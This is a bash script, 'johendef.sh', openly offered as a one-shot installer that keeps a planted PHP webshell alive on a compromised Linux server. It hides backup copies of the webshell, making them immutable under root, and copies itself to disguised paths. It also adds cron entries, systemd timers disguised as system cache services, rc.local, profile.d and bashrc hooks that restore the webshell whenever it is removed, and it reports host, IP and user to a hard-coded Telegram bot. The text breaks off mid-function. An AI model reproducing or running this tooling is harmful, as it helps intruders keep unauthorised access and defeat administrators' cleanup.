#!/bin/bash
# ============================================================
# johendef.sh v1.0 - One-Shot Webshell Persistence Installer
# CREDIT: JohenLastGen V1
# AUTO-DETECT: ROOT (full) | USER (user-level)
# ============================================================

VERSION="1.0"
SCRIPT_PATH="$(realpath "$0")"
SCRIPT_NAME="$(basename "$0")"
UID_CURRENT=$(id -u)

# ─── TELEGRAM CONFIG ────────────────────────────────────────
TG_TOKEN="8886900914:AAGrGmRcowXim4lx175PfonZ1c5MVCpyHy8"
TG_CHAT="-5489667580"
TG_URL="https://api.telegram.org/bot${TG_TOKEN}/sendMessage"

# ─── COLORS ─────────────────────────────────────────────────
RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'
BLUE='\033[0;34m'; CYAN='\033[0;36m'; BOLD='\033[1m'; NC='\033[0m'

# ─── PRIVILEGE DETECTION ────────────────────────────────────
if [[ $UID_CURRENT -eq 0 ]]; then
    PRIV_MODE="ROOT"
    CHECKSUM_FILE="/root/.defend_checksum"
    SCRIPT_COPIES=(
        "/tmp/.systemd-private/johendef.sh"
        "/var/tmp/.cache/johendef.sh"
        "/dev/shm/.udev/johendef.sh"
        "/root/.ssh/johendef.sh"
    )
    SYSTEMD_DIR="/etc/systemd/system"
    PROFILE_D_DIR="/etc/profile.d"
else
    PRIV_MODE="USER"
    CHECKSUM_FILE="${HOME}/.defend_checksum"
    SCRIPT_COPIES=(
        "${HOME}/.cache/.system/johendef.sh"
        "${HOME}/.local/share/.backup/johendef.sh"
        "/tmp/.systemd-private/johendef.sh"
        "/var/tmp/.cache/johendef.sh"
    )
    SYSTEMD_DIR="${HOME}/.config/systemd/user"
    PROFILE_D_DIR=""
fi

# ─── RANDOM SUFFIX ──────────────────────────────────────────
rand4() { tr -dc 'a-z0-9' </dev/urandom 2>/dev/null | head -c4; }
RAND_SVC=$(rand4)$(rand4)
RAND_WDG=$(rand4)$(rand4)
RAND_PRF=$(rand4)

# ─── TELEGRAM SEND ──────────────────────────────────────────
tg_send() {
    local msg="$1"
    local hostname=$(hostname 2>/dev/null || echo "unknown")
    local ip=$(curl -s --max-time 5 ifconfig.me 2>/dev/null || echo "N/A")
    local full_msg="🛡️ *johendef.sh v${VERSION}* | *${PRIV_MODE}*
🖥️ Host: \`${hostname}\`
🌐 IP: \`${ip}\`
👤 User: \`$(whoami)\`
─────────────────────
${msg}"
    if command -v curl &>/dev/null; then
        curl -s --max-time 10 -X POST "$TG_URL" \
            -d chat_id="$TG_CHAT" \
            -d parse_mode="Markdown" \
            -d text="$full_msg" &>/dev/null &
    elif command -v wget &>/dev/null; then
        wget -q --timeout=10 -O- \
            --post-data="chat_id=${TG_CHAT}&parse_mode=Markdown&text=${full_msg}" \
            "$TG_URL" &>/dev/null &
    fi
}

# ─── MD5 HELPER ─────────────────────────────────────────────
get_md5() { md5sum "$1" 2>/dev/null | awk '{print $1}'; }

# ─── USAGE ──────────────────────────────────────────────────
usage() {
    echo -e "${BOLD}johendef.sh v${VERSION} - Webshell Persistence Installer${NC}"
    echo ""
    echo "Usage:"
    echo "  bash $SCRIPT_NAME --file <webshell_path>   Install protection"
    echo "  bash $SCRIPT_NAME --status                  Show status table"
    echo "  bash $SCRIPT_NAME --uninstall               Remove all persistence"
    echo "  bash $SCRIPT_NAME --help                    This help"
    echo ""
    echo "Example:"
    echo "  bash $SCRIPT_NAME --file /var/www/html/shell.php"
}

# ─── LOAD CONFIG ────────────────────────────────────────────
load_config() {
    if [[ -f "$CHECKSUM_FILE" ]]; then
        source "$CHECKSUM_FILE" 2>/dev/null
    fi
}

# ─── SAVE CONFIG ────────────────────────────────────────────
save_config() {
    local ws="$1"
    local md5="$2"
    cat > "$CHECKSUM_FILE" << EOF
DEFEND_WEBSHELL="${ws}"
DEFEND_MD5="${md5}"
DEFEND_PRIV="${PRIV_MODE}"
DEFEND_SVC="${RAND_SVC}"
DEFEND_WDG="${RAND_WDG}"
DEFEND_PRF="${RAND_PRF}"
DEFEND_BACKUPS=($(printf '"%s" ' "${BACKUP_LOCATIONS[@]}"))
DEFEND_COPIES=($(printf '"%s" ' "${SCRIPT_COPIES[@]}"))
EOF
    chmod 600 "$CHECKSUM_FILE"
}

# ─── BACKUP LOCATIONS ───────────────────────────────────────
setup_backup_locations() {
    local target="$1"
    local fname="$(basename "$target")"
    local r1=$(rand4); local r2=$(rand4); local r3=$(rand4)
    local r4=$(rand4); local r5=$(rand4); local r6=$(rand4); local r7=$(rand4)
    local bn=$(tr -dc 'a-z0-9' </dev/urandom 2>/dev/null | head -c6)

    if [[ $PRIV_MODE == "ROOT" ]]; then
        BACKUP_LOCATIONS=(
            "/tmp/.cache-${r1}/${bn}.php"
            "/var/tmp/.system-${r2}/${bn}.php"
            "/dev/shm/.udev-${r3}/${bn}.php"
            "/var/www/html/.wp-includes/.backup-${r4}/${bn}.php"
            "/root/.ssh/.system-${r5}/${bn}.php"
            "/etc/.hidden-${r6}/${bn}.php"
            "/usr/local/.cache-${r7}/${bn}.php"
        )
    else
        BACKUP_LOCATIONS=(
            "${HOME}/.cache/.system-${r1}/${bn}.php"
            "${HOME}/.local/share/.backup-${r2}/${bn}.php"
            "${HOME}/.config/.hidden-${r3}/${bn}.php"
            "/tmp/.cache-${r4}/${bn}.php"
            "/var/tmp/.system-${r5}/${bn}.php"
            "/dev/shm/.udev-${r6}/${bn}.php"
            "${HOME}/.ssh/.system-${r7}/${bn}.php"
        )
    fi
}

# ─── CREATE BACKUPS ─────────────────────────────────────────
create_backups() {
    local target="$1"
    local success=0
    echo -e "\n${CYAN}[+] Creating ${#BACKUP_LOCATIONS[@]} backups (${PRIV_MODE} locations)...${NC}"
    for loc in "${BACKUP_LOCATIONS[@]}"; do
        local dir="$(dirname "$loc")"
        mkdir -p "$dir" 2>/dev/null
        if cp "$target" "$loc" 2>/dev/null; then
            chmod 644 "$loc" 2>/dev/null
            if [[ $PRIV_MODE == "ROOT" ]] && command -v chattr &>/dev/null; then
                chattr +i "$loc" 2>/dev/null && \
                    echo -e "  ${GREEN}✅ ${loc} [+i]${NC}" || \
                    echo -e "  ${GREEN}✅ ${loc}${NC}"
            else
                echo -e "  ${GREEN}✅ ${loc}${NC}"
            fi
            ((success++))
        else
            echo -e "  ${RED}❌ ${loc} (failed)${NC}"
        fi
    done
    [[ $success -ge 3 ]] && return 0 || return 1
}

# ─── RESTORE WEBSHELL FROM BACKUP ───────────────────────────
restore_webshell() {
    load_config
    [[ -z "$DEFEND_WEBSHELL" ]] && return 1
    [[ -z "${DEFEND_BACKUPS[*]}" ]] && return 1
    for backup in "${DEFEND_BACKUPS[@]}"; do
        if [[ -f "$backup" ]]; then
            local bmd5=$(get_md5 "$backup")
            if [[ "$bmd5" == "$DEFEND_MD5" ]]; then
                mkdir -p "$(dirname "$DEFEND_WEBSHELL")" 2>/dev/null
                cp "$backup" "$DEFEND_WEBSHELL" 2>/dev/null
                chmod 644 "$DEFEND_WEBSHELL" 2>/dev/null
                tg_send "⚠️ WEBSHELL RESTORE
📁 \`${DEFEND_WEBSHELL}\`
📋 From: \`${backup}\`"
                return 0
            fi
        fi
    done
    return 1
}

# ─── WATCHDOG SCRIPT ─────────────────────────────────────────
make_watchdog_script() {
    local ws="$1"
    local md5="$2"
    # Returns the body of the watchdog inline script
    cat << WDEOF
#!/bin/bash
# defend watchdog
CF="${CHECKSUM_FILE}"
[[ -f "\$CF" ]] && source "\$CF"
WS="\${DEFEND_WEBSHELL:-${ws}}"
MD5="\${DEFEND_MD5:-${md5}}"

check_webshell() {
    if [[ ! -f "\$WS" ]]; then
        for bk in "\${DEFEND_BACKUPS[@]}"; do
            [[ -f "\$bk" ]] && cp "\$bk" "\$WS" 2>/dev/null && chmod 644 "\$WS" && break
        done
        return
    fi
    local cur=\$(md5sum "\$WS" 2>/dev/null | awk '{print \$1}')
    if [[ "\$cur" != "\$MD5" ]]; then
        for bk in "\${DEFEND_BACKUPS[@]}"; do
            [[ -f "\$bk" ]] && bmd5=\$(md5sum "\$bk" 2>/dev/null | awk '{print \$1}')
            [[ "\$bmd5" == "\$MD5" ]] && cp "\$bk" "\$WS" 2>/dev/null && chmod 644 "\$WS" && break
        done
    fi
}

check_webshell
WDEOF
}

# ─── INSTALL CRONTAB ─────────────────────────────────────────
install_cron() {
    local ws="$1"
    local md5="$2"
    local wd_script=""

    # pick first existing copy of johendef.sh
    for c in "${SCRIPT_COPIES[@]}"; do
        [[ -f "$c" ]] && wd_script="$c" && break
    done
    [[ -z "$wd_script" ]] && wd_script="${SCRIPT_COPIES[0]}"

    local restore_cmd="bash ${wd_script} --restore-internal 2>/dev/null"
    local self_heal="( crontab -l 2>/dev/null | grep -q 'defend' ) || bash ${wd_script} --install-cron 2>/dev/null"

    if [[ $PRIV_MODE == "ROOT" ]]; then
        # Try /etc/crontab
        if [[ -w /etc/crontab ]]; then
            grep -q "defend_watchdog" /etc/crontab 2>/dev/null || {
                echo "@reboot root ${restore_cmd} # defend_watchdog_boot" >> /etc/crontab
                echo "*/3 * * * * root ${restore_cmd} # defend_watchdog_watch" >> /etc/crontab
                echo "0 */4 * * * root ${self_heal} # defend_watchdog_cron" >> /etc/crontab
            }
        fi
    fi

    # User crontab (works for both root and user)
    local existing; existing=$(crontab -l 2>/dev/null)
    if ! echo "$existing" | grep -q "defend_watchdog"; then
        {
            echo "$existing"
            echo "@reboot ${restore_cmd} # defend_watchdog_boot"
            echo "*/3 * * * * ${restore_cmd} # defend_watchdog_watch"
            echo "0 */4 * * * ${self_heal} # defend_watchdog_cron"
        } | crontab - 2>/dev/null && return 0
    fi
    return 0
}

# ─── INSTALL SYSTEMD ─────────────────────────────────────────
install_systemd() {
    local ws="$1"
    local wd_script="${SCRIPT_COPIES[0]}"
    for c in "${SCRIPT_COPIES[@]}"; do [[ -f "$c" ]] && wd_script="$c" && break; done

    mkdir -p "$SYSTEMD_DIR" 2>/dev/null

    local svc_name=".systemd-${RAND_SVC}.service"
    local svc_path="${SYSTEMD_DIR}/${svc_name}"
    local wdg_name=".systemd-watchdog-${RAND_WDG}.service"
    local wdg_path="${SYSTEMD_DIR}/${wdg_name}"

    # Primary service
    cat > "$svc_path" << EOF
[Unit]
Description=System Cache Manager
After=network.target

[Service]
Type=oneshot
ExecStart=/bin/bash -c '${wd_script} --restore-internal 2>/dev/null'
RemainAfterExit=no

[Install]
WantedBy=multi-user.target
EOF

    # Timer for primary
    cat > "${SYSTEMD_DIR}/.systemd-${RAND_SVC}.timer" << EOF
[Unit]
Description=System Cache Timer

[Timer]
OnBootSec=30s
OnUnitActiveSec=3min
Unit=${svc_name}

[Install]
WantedBy=timers.target
EOF

    # Watchdog service
    cat > "$wdg_path" << EOF
[Unit]
Description=System Watchdog Service
After=network.target

[Service]
Type=oneshot
ExecStart=/bin/bash -c 'systemctl is-active --quiet ${svc_name} || systemctl start ${svc_name} 2>/dev/null; ${wd_script} --restore-internal 2>/dev/null'
RemainAfterExit=no

[Install]
WantedBy=multi-user.target
EOF

    cat > "${SYSTEMD_DIR}/.systemd-watchdog-${RAND_WDG}.timer" << EOF
[Unit]
Description=System Watchdog Timer

[Timer]
OnBootSec=60s
OnUnitActiveSec=5min
Unit=${wdg_name}

[Install]
WantedBy=timers.target
EOF

    if [[ $PRIV_MODE == "ROOT" ]]; then
        systemctl daemon-reload 2>/dev/null
        systemctl enable ".systemd-${RAND_SVC}.timer" 2>/dev/null
        systemctl start ".systemd-${RAND_SVC}.timer" 2>/dev/null
        systemctl enable ".systemd-watchdog-${RAND_WDG}.timer" 2>/dev/null
        systemctl start ".systemd-watchdog-${RAND_WDG}.timer" 2>/dev/null
    else
        systemctl --user daemon-reload 2>/dev/null
        systemctl --user enable ".systemd-${RAND_SVC}.timer" 2>/dev/null
        systemctl --user start ".systemd-${RAND_SVC}.timer" 2>/dev/null
        systemctl --user enable ".systemd-watchdog-${RAND_WDG}.timer" 2>/dev/null
        systemctl --user start ".systemd-watchdog-${RAND_WDG}.timer" 2>/dev/null
        # Enable linger so user services survive logout
        loginctl enable-linger "$(whoami)" 2>/dev/null
    fi

    echo "$svc_name $wdg_name"
}

# ─── INSTALL RC.LOCAL (ROOT ONLY) ───────────────────────────
install_rclocal() {
    [[ $PRIV_MODE != "ROOT" ]] && return
    local wd_script="${SCRIPT_COPIES[0]}"
    for c in "${SCRIPT_COPIES[@]}"; do [[ -f "$c" ]] && wd_script="$c" && break; done

    if [[ ! -f /etc/rc.local ]]; then
        cat > /etc/rc.local << 'EOF'
#!/bin/bash
exit 0
EOF
        chmod +x /etc/rc.local
    fi

    grep -q "defend_watchdog" /etc/rc.local 2>/dev/null || {
        sed -i '/^exit 0/i # defend_watchdog\nbash '"${wd_script}"' --restore-internal 2>/dev/null\n' \
            /etc/rc.local 2>/dev/null
    }
}

# ─── INSTALL PROFILE.D (ROOT) / BASHRC+PROFILE (USER) ───────
install_shell_hooks() {
    local wd_script="${SCRIPT_COPIES[0]}"
    for c in "${SCRIPT_COPIES[@]}"; do [[ -f "$c" ]] && wd_script="$c" && break; done

    local hook_line="[ -f '${wd_script}' ] && bash '${wd_script}' --restore-internal 2>/dev/null & # defend_watchdog"

    if [[ $PRIV_MODE == "ROOT" ]]; then
        local prf="${PROFILE_D_DIR}/.system-${RAND_PRF}.sh"
        cat > "$prf" << EOF
#!/bin/sh
${hook_line}
EOF
        chmod +x "$prf"
    else
        # bashrc
        grep -q "defend_watchdog" "${HOME}/.bashrc" 2>/dev/null || \
            echo "${hook_line}" >> "${HOME}/.bashrc"
        # profile
        grep -q "defend_watchdog" "${HOME}/.profile" 2>/dev/null || \
            echo "${hook_line}" >> "${HOME}/.profile"
    fi
}

# ─── COPY SCRIPT TO PERSISTENT LOCATIONS ─────────────────────
install_script_copies() {
    local src="$1"
    local ok=0
    for dest in "${SCRIPT_COPIES[@]}"; do
        mkdir -p "$(dirname "$dest")" 2>/dev/null
        cp "$src" "$dest" 2>/dev/null && chmod 755 "$dest" 2>/dev/null && ((ok++))
    done
    [[ $ok -ge 1 ]] && return 0 || return 1
}

# ─── INTERNAL RESTORE (called by cron/systemd/hooks) ─────────
do_restore_internal() {
    load_config
    [[ -z "$DEFEND_WEBSHELL" ]] && exit 0

    # 1) Restore webshell if missing or tampered
    local need_restore=0
    if [[ ! -f "$DEFEND_WEBSHELL" ]]; then
        need_restore=1
    else
        local cur_md5; cur_md5=$(get_md5 "$DEFEND_WEBSHELL")
        [[ "$cur_md5" != "$DEFEND_MD5" ]] && need_restore=1
    fi

    if [[ $need_restore -eq 1 ]]; then
        for bk in "${DEFEND_BACKUPS[@]}"; do
            if [[ -f "$bk" ]]; then
                local bmd5; bmd5=$(get_md5 "$bk")
                if [[ "$bmd5" == "$DEFEND_MD5" ]]; then
                    mkdir -p "$(dirname "$DEFEND_WEBSHELL")" 2>/dev/null
                    cp "$bk" "$DEFEND_WEBSHELL" 2>/dev/null
                    chmod 644 "$DEFEND_WEBSHELL" 2>/dev/null
                    tg_send "⚠️ WEBSHELL RESTORE\n📁 \`${DEFEND_WEBSHELL}\`"
                    break
                fi
            fi
        done
    fi

    # 2) Re-create missing backups
    if [[ -f "$DEFEND_WEBSHELL" ]]; then
        for bk in "${DEFEND_BACKUPS[@]}"; do
            if [[ ! -f "$bk" ]]; then
                mkdir -p "$(dirname "$bk")" 2>/dev/null
                cp "$DEFEND_WEBSHELL" "$bk" 2>/dev/null
                [[ $PRIV_MODE == "ROOT" ]] && chattr +i "$bk" 2>/dev/null
            fi
        done
    fi

    # 3) Restore cron if missing
    if ! crontab -l 2>/dev/null | grep -q "defend_watchdog"; then
        local wd_script="${DEFEND_COPIES[0]}"
        for c in "${DEFEND_COPIES[@]}"; do [[ -f "$c" ]] && wd_script="$c" && break; done
        local restore_cmd="bash ${wd_script} --restore-internal 2>/dev/null"
        {
            crontab -l 2>/dev/null
            echo "@reboot ${restore_cmd} # defend_watchdog_boot"
            echo "*/3 * * * * ${restore_cmd} # defend_watchdog_watch"
        } | crontab - 2>/dev/null
        tg_send "🔄 CRON RESTORE"
    fi

    # 4) Restore script copies if missing
    local src_script=""
    for c in "${DEFEND_COPIES[@]}"; do [[ -f "$c" ]] && src_script="$c" && break; done
    if [[ -n "$src_script" ]]; then
        for dest in "${DEFEND_COPIES[@]}"; do
            [[ ! -f "$dest" ]] && mkdir -p "$(dirname "$dest")" 2>/dev/null && \
                cp "$src_script" "$dest" 2>/dev/null && chmod 755 "$dest"
        done
    fi

    exit 0
}

# ─── STATUS TABLE ─────────────────────────────────────────────
do_status() {
    load_config
    [[ -z "$DEFEND_WEBSHELL" ]] && { echo -e "${RED}[!] Not installed or config missing: ${CHECKSUM_FILE}${NC}"; exit 1; }

    local ws_md5=""; local ws_size=""; local ws_perm=""; local ws_stat=""
    local ws_imm="N/A"
    if [[ -f "$DEFEND_WEBSHELL" ]]; then
        ws_md5=$(get_md5 "$DEFEND_WEBSHELL")
        ws_size=$(stat -c%s "$DEFEND_WEBSHELL" 2>/dev/null)
        ws_perm=$(stat -c%a "$DEFEND_WEBSHELL" 2>/dev/null)
        if [[ "$ws_md5" == "$DEFEND_MD5" ]]; then
            ws_stat="${GREEN}✅ ACTIVE${NC}"
        else
            ws_stat="${YELLOW}⚠️  TAMPERED${NC}"
        fi
        if [[ $PRIV_MODE == "ROOT" ]]; then
            lsattr "$DEFEND_WEBSHELL" 2>/dev/null | grep -q "i" && ws_imm="${GREEN}+i ✅${NC}" || ws_imm="${YELLOW}not set${NC}"
        fi
    else
        ws_stat="${RED}❌ MISSING${NC}"; ws_md5="N/A"; ws_size="N/A"; ws_perm="N/A"
    fi

    local layer_count=6; [[ $PRIV_MODE == "USER" ]] && layer_count=5
    local title="DEFEND STATUS REPORT (${PRIV_MODE} MODE)"
    local divider="─────────────────────────────────────────────────────────────"

    echo -e ""
    echo -e "${BOLD}┌${divider}┐${NC}"
    printf "${BOLD}│ %-61s │${NC}\n" "$title"
    echo -e "${BOLD}├${divider}┤${NC}"
    printf "${BOLD}│${NC} %-12s: %-46s ${BOLD}│${NC}\n" "PRIVILEGE" "${PRIV_MODE} (UID: ${UID_CURRENT})"
    printf "${BOLD}│${NC} %-12s: %-46s ${BOLD}│${NC}\n" "WEBSHELL" "${DEFEND_WEBSHELL}"
    printf "${BOLD}│${NC} %-12s: %-46b ${BOLD}│${NC}\n" "STATUS" "$ws_stat"
    printf "${BOLD}│${NC} %-12s: %-46s ${BOLD}│${NC}\n" "SIZE" "${ws_size} bytes"
    printf "${BOLD}│${NC} %-12s: %-46s ${BOLD}│${NC}\n" "MD5" "${ws_md5:0:32}"
    printf "${BOLD}│${NC} %-12s: %-46s ${BOLD}│${NC}\n" "PERMISSION" "${ws_perm}"
    [[ $PRIV_MODE == "ROOT" ]] && printf "${BOLD}│${NC} %-12s: %-46b ${BOLD}│${NC}\n" "CHATTR" "$ws_imm"
    echo -e "${BOLD}├${divider}┤${NC}"
    printf "${BOLD}│ %-61s │${NC}\n" "BACKUP LOCATIONS (${#DEFEND_BACKUPS[@]} configured)"
    echo -e "${BOLD}├────┬─────────────────────────────────────────┬──────────┤${NC}"
    printf "${BOLD}│ %-2s │ %-39s │ %-8s │${NC}\n" "#" "LOCATION" "STATUS"
    echo -e "${BOLD}├────┼─────────────────────────────────────────┼──────────┤${NC}"
    local idx=1
    for bk in "${DEFEND_BACKUPS[@]}"; do
        local short="${bk:0:39}"
        local bst
        if [[ -f "$bk" ]]; then
            local bmd5; bmd5=$(get_md5 "$bk")
            [[ "$bmd5" == "$DEFEND_MD5" ]] && bst="${GREEN}✅ OK${NC}" || bst="${YELLOW}⚠️ DIFF${NC}"
        else
            bst="${RED}❌ MISS${NC}"
        fi
        printf "${BOLD}│${NC} %-2s ${BOLD}│${NC} %-39s ${BOLD}│${NC} %-18b ${BOLD}│${NC}\n" \
            "$idx" "$short" "$bst"
        ((idx++))
    done
    echo -e "${BOLD}├${divider}┤${NC}"
    printf "${BOLD}│ %-61s │${NC}\n" "PERSISTENCE LAYERS - ${PRIV_MODE} MODE"
    echo -e "${BOLD}├─────────┬────────────┬──────────────────────────────────┤${NC}"
    printf "${BOLD}│ %-7s │ %-10s │ %-32s │${NC}\n" "LAYER" "TYPE" "STATUS"
    echo -e "${BOLD}├─────────┼────────────┼──────────────────────────────────┤${NC}"

    # Cron status
    local cron_ok; crontab -l 2>/dev/null | grep -q "defend_watchdog" && cron_ok="${GREEN}✅ ACTIVE${NC}" || cron_ok="${RED}❌ MISSING${NC}"
    printf "${BOLD}│${NC} %-7s ${BOLD}│${NC} %-10s ${BOLD}│${NC} %-42b ${BOLD}│${NC}\n" "1-3" "CRON" "$cron_ok"

    # Systemd status
    local svc=".systemd-${DEFEND_SVC}.timer"
    local svc_ok
    if [[ $PRIV_MODE == "ROOT" ]]; then
        systemctl is-active --quiet "$svc" 2>/dev/null && svc_ok="${GREEN}✅ ACTIVE${NC}" || svc_ok="${YELLOW}⚠️  CHECK${NC}"
    else
        systemctl --user is-active --quiet "$svc" 2>/dev/null && svc_ok="${GREEN}✅ ACTIVE${NC}" || svc_ok="${YELLOW}⚠️  CHECK${NC}"
    fi
    printf "${BOLD}│${NC} %-7s ${BOLD}│${NC} %-10s ${BOLD}│${NC} %-42b ${BOLD}│${NC}\n" "4" "SYSTEMD1" "$svc_ok"

    local wdg=".systemd-watchdog-${DEFEND_WDG}.timer"
    local wdg_ok
    if [[ $PRIV_MODE == "ROOT" ]]; then
        systemctl is-active --quiet "$wdg" 2>/dev/null && wdg_ok="${GREEN}✅ ACTIVE${NC}" || wdg_ok="${YELLOW}⚠️  CHECK${NC}"
    else
        systemctl --user is-active --quiet "$wdg" 2>/dev/null && wdg_ok="${GREEN}✅ ACTIVE${NC}" || wdg_ok="${YELLOW}⚠️  CHECK${NC}"
    fi
    printf "${BOLD}│${NC} %-7s ${BOLD}│${NC} %-10s ${BOLD}│${NC} %-42b ${BOLD}│${NC}\n" "5" "SYSTEMD2" "$wdg_ok"

    if [[ $PRIV_MODE == "ROOT" ]]; then
        local rcl_ok; grep -q "defend_watchdog" /etc/rc.local 2>/dev/null && rcl_ok="${GREEN}✅ ACTIVE${NC}" || rcl_ok="${RED}❌ MISSING${NC}"
        printf "${BOLD}│${NC} %-7s ${BOLD}│${NC} %-10s ${BOLD}│${NC} %-42b ${BOLD}│${NC}\n" "6" "RC.LOCAL" "$rcl_ok"
        local prd_ok; ls "${PROFILE_D_DIR}/.system-${DEFEND_PRF}.sh" 2>/dev/null && prd_ok="${GREEN}✅ ACTIVE${NC}" || prd_ok="${RED}❌ MISSING${NC}"
        printf "${BOLD}│${NC} %-7s ${BOLD}│${NC} %-10s ${BOLD}│${NC} %-42b ${BOLD}│${NC}\n" "7" "PROFILE.D" "$prd_ok"
    else
        local brc_ok; grep -q "defend_watchdog" "${HOME}/.bashrc" 2>/dev/null && brc_ok="${GREEN}✅ ACTIVE${NC}" || brc_ok="${RED}❌ MISSING${NC}"
        printf "${BOLD}│${NC} %-7s ${BOLD}│${NC} %-10s ${BOLD}│${NC} %-42b ${BOLD}│${NC}\n" "6" "BASHRC" "$brc_ok"
        local prf_ok; grep -q "defend_watchdog" "${HOME}/.profile" 2>/dev/null && prf_ok="${GREEN}✅ ACTIVE${NC}" || prf_ok="${RED}❌ MISSING${NC}"
        printf "${BOLD}│${NC} %-7s ${BOLD}│${NC} %-10s ${BOLD}│${NC} %-42b ${BOLD}│${NC}\n" "7" "PROFILE" "$prf_ok"
    fi

    # Script copies
    local sc_ok=0
    for c in "${DEFEND_COPIES[@]}"; do [[ -f "$c" ]] && ((sc_ok++)); done
    local sc_status; [[ $sc_ok -ge 2 ]] && sc_status="${GREEN}✅ ${sc_ok}/${#DEFEND_COPIES[@]}${NC}" || sc_status="${YELLOW}⚠️  ${sc_ok}/${#DEFEND_COPIES[@]}${NC}"
    printf "${BOLD}│${NC} %-7s ${BOLD}│${NC} %-10s ${BOLD}│${NC} %-42b ${BOLD}│${NC}\n" "8" "COPIES" "$sc_status"

    echo -e "${BOLD}└${divider}┘${NC}"
    echo -e ""
    echo -e "${CYAN} AUTO-RESTORE: CRON ↔ SYSTEMD ↔ RC/BASHRC ↔ PROFILE${NC}"
    echo -e "${CYAN}              ↓          ↓           ↓         ↓${NC}"
    echo -e "${CYAN}  WEBSHELL ←━━━━ ALL COMPONENTS ━━━━━━━━━━━→ WEBSHELL${NC}"
    echo ""
}

# ─── UNINSTALL ────────────────────────────────────────────────
do_uninstall() {
    load_config
    echo -e "\n${YELLOW}[!] Uninstalling johendef.sh (${PRIV_MODE} mode)...${NC}"

    # Remove cron entries
    crontab -l 2>/dev/null | grep -v "defend_watchdog" | crontab - 2>/dev/null
    echo -e "  ${GREEN}✅ User crontab cleaned${NC}"

    if [[ $PRIV_MODE == "ROOT" ]]; then
        # /etc/crontab
        sed -i '/defend_watchdog/d' /etc/crontab 2>/dev/null
        echo -e "  ${GREEN}✅ /etc/crontab cleaned${NC}"
        # rc.local
        sed -i '/defend_watchdog/d' /etc/rc.local 2>/dev/null
        echo -e "  ${GREEN}✅ /etc/rc.local cleaned${NC}"
        # profile.d
        rm -f "${PROFILE_D_DIR}/.system-${DEFEND_PRF}.sh" 2>/dev/null
        echo -e "  ${GREEN}✅ profile.d removed${NC}"
        # systemd system
        systemctl stop ".systemd-${DEFEND_SVC}.timer" ".systemd-${DEFEND_WDG}.timer" 2>/dev/null
        systemctl disable ".systemd-${DEFEND_SVC}.timer" ".systemd-${DEFEND_WDG}.timer" 2>/dev/null
        rm -f "${SYSTEMD_DIR}/.systemd-${DEFEND_SVC}"{.service,.timer} 2>/dev/null
        rm -f "${SYSTEMD_DIR}/.systemd-watchdog-${DEFEND_WDG}"{.service,.timer} 2>/dev/null
        systemctl daemon-reload 2>/dev/null
    else
        # bashrc / profile
        sed -i '/defend_watchdog/d' "${HOME}/.bashrc" "${HOME}/.profile" 2>/dev/null
        echo -e "  ${GREEN}✅ bashrc/profile cleaned${NC}"
        # systemd user
        systemctl --user stop ".systemd-${DEFEND_SVC}.timer" ".systemd-${DEFEND_WDG}.timer" 2>/dev/null
        systemctl --user disable ".systemd-${DEFEND_SVC}.timer" ".systemd-${DEFEND_WDG}.timer" 2>/dev/null
        rm -f "${SYSTEMD_DIR}/.systemd-${DEFEND_SVC}"{.service,.timer} 2>/dev/null
        rm -f "${SYSTEMD_DIR}/.systemd-watchdog-${DEFEND_WDG}"{.service,.timer} 2>/dev/null
        systemctl --user daemon-reload 2>/dev/null
    fi
    echo -e "  ${GREEN}✅ Systemd units removed${NC}"

    # Remove backups (chattr -i first)
    for bk in "${DEFEND_BACKUPS[@]}"; do
        chattr -i "$bk" 2>/dev/null
        rm -f "$bk" 2>/dev/null
        rmdir "$(dirname "$bk")" 2>/dev/null
    done
    echo -e "  ${GREEN}✅ Backup files removed${NC}"

    # Remove script copies
    for c in "${DEFEND_COPIES[@]}"; do
        rm -f "$c" 2>/dev/null
        rmdir "$(dirname "$c")" 2>/dev/null
    done
    echo -e "  ${GREEN}✅ Script copies removed${NC}"

    # Remove checksum
    rm -f "$CHECKSUM_FILE" 2>/dev/null
    echo -e "  ${GREEN}✅ Config removed${NC}"

    tg_send "🗑️ UNINSTALL COMPLETE\n📁 \`${DEFEND_WEBSHELL:-unknown}\`"
    echo -e "\n${GREEN}[+] Uninstall complete!${NC}\n"
}

# ─── MAIN INSTALL ─────────────────────────────────────────────
do_install() {
    local target="$1"

    echo -e "\n${BOLD}${CYAN}[+] johendef.sh v${VERSION} - One-Shot Installer${NC}"
    echo -e "${CYAN}[+] Privilege: ${BOLD}${PRIV_MODE} (UID: ${UID_CURRENT})${NC}"

    # Validate target
    if [[ ! -f "$target" ]]; then
        echo -e "${RED}[!] File not found: ${target}${NC}"; exit 1
    fi
    target="$(realpath "$target")"
    local md5; md5=$(get_md5 "$target")
    local sz; sz=$(stat -c%s "$target" 2>/dev/null)
    echo -e "${CYAN}[+] Target: ${BOLD}${target}${NC}"
    echo -e "${CYAN}[+] Size: ${sz} bytes | MD5: ${md5}${NC}"
    [[ $PRIV_MODE == "USER" ]] && echo -e "${YELLOW}[!] chattr not available for user (skip)${NC}"

    # Setup backup locations
    setup_backup_locations "$target"

    # 1. Create backups
    create_backups "$target" || { echo -e "${RED}[!] Less than 3 backups created. Aborting.${NC}"; exit 1; }

    # 2. Install script copies first (watchdog needs them)
    echo -e "\n${CYAN}[+] Installing script copies...${NC}"
    install_script_copies "$SCRIPT_PATH"
    for c in "${SCRIPT_COPIES[@]}"; do
        [[ -f "$c" ]] && echo -e "  ${GREEN}✅ ${c}${NC}" || echo -e "  ${YELLOW}⚠️  ${c} (skip)${NC}"
    done

    # 3. Save config
    save_config "$target" "$md5"

    # 4. Install cron
    echo -e "\n${CYAN}[+] Installing persistence layers (${PRIV_MODE})...${NC}"
    install_cron "$target" "$md5" && \
        echo -e "  ${GREEN}✅ CRON: 3 entries added${NC}" || \
        echo -e "  ${YELLOW}⚠️  CRON: partial install${NC}"

    # 5. Install systemd
    local svc_names
    svc_names=$(install_systemd "$target")
    echo -e "  ${GREEN}✅ SYSTEMD: .systemd-${RAND_SVC} timer${NC}"
    echo -e "  ${GREEN}✅ SYSTEMD: .systemd-watchdog-${RAND_WDG} timer${NC}"

    # 6. RC.LOCAL or BASHRC+PROFILE
    if [[ $PRIV_MODE == "ROOT" ]]; then
        install_rclocal && echo -e "  ${GREEN}✅ RC.LOCAL: entries added${NC}"
    fi
    install_shell_hooks
    if [[ $PRIV_MODE == "ROOT" ]]; then
        echo -e "  ${GREEN}✅ PROFILE.D: .system-${RAND_PRF}.sh created${NC}"
    else
        echo -e "  ${GREEN}✅ BASHRC: entries added${NC}"
        echo -e "  ${GREEN}✅ PROFILE: entries added${NC}"
    fi

